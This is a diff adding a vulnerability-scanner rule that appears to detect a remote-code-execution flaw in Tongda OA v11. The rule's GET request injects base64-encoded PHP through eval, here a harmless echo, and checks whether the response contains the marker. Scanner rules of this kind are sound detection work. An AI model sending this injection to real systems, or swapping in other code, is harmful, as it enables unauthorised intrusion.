@@ -1,0 +1,8 @@
+name: tongda-v11-getdata-rce
+rules:
+  - method: GET
+    path: "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'vuln_test')
+detail:
+  author: 666
